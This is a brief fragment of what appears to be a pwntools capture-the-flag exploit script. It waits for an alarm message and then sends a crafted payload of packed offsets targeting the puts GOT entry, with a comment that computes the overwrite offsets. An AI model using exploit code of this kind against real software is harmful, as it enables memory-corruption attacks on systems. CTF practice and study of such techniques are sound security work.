...
for i in range(16):
        io.recvuntil('Alarm has been hit!')
io.recv()
#offset = 4096+7, target in 4096+7+8+8, first return read_bytes = 16+10, payload len = 32, so amt = 4096+8+8+8+32
io.sendline(p32(4096+7-10)+p32(4096+7+8+8+32)+p64(elf.got['puts']-1)+'ABCDEFGHIJ')
